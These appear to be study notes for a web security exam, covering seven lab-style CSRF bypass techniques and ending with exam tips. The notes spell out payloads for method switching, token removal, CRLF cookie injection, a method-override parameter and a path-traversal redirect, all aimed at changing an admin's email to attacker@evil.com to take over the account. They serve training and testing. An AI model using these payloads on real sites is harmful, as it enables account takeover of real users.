## 🎯 Target Location

**Primary Target:** Email/Password Change Functionality

**Goal:** Change admin's email → Reset admin's password → Login as admin

## 📋 CSRF Bypass Techniques

### Lab 1: Token Validation Depends on Request Method
**Bypass:** Change POST to GET

**Original Request:**
```http
POST /my-account/change-email HTTP/1.1
Content-Type: application/x-www-form-urlencoded

email=attacker@evil.com&csrf=abc123
```

**Bypass:**
```http
GET /my-account/change-email?email=attacker@evil.com HTTP/1.1
```

---

### Lab 2: Token Validation Depends on Token Being Present
**Bypass:** Simply remove CSRF token

---

### Lab 3: Token Not Tied to User Session
**Bypass:** Use your own CSRF token for admin

---

### Lab 4: Token Tied to Non-Session Cookie
**Bypass:** Set victim's csrfKey cookie via CRLF injection

**Exploit:**
```html
<script>
location="https://vulnerable-site.com/?search=w;%0aSet-Cookie:+csrfKey=YOUR_KEY"
</script>
```

---

### Lab 5: Token Duplicated in Cookie
**Bypass:** Set both cookie and parameter to same value

**CRLF Injection:**
```
/?search=w%0d%0aSet-Cookie:%20csrf=kek%3b%20SameSite=None
```

---

### Lab 6: SameSite Lax Bypass via Method Override
**Bypass:** Use GET with `_method=POST` parameter

**Payload:**
```
/my-account/change-email?email=attacker@evil.com&_method=POST
```

---

### Lab 7: SameSite Strict Bypass via Client-Side Redirect
**Bypass:** Use path traversal in redirect parameter

**Payload:**
```
/post/comment/confirmation?postId=1../../../my-account/change-email?email=attacker@evil.com%26submit=1
```

## 🎓 Exam Tips

1. **Target email change functionality** - Most common CSRF location
2. **Try method change first** - POST → GET is easiest bypass
3. **Remove CSRF token** - Sometimes validation is optional
4. **Use Burp's CSRF PoC generator** - Saves time
5. **Combine with XSS** - CSRF + XSS = powerful attack

---
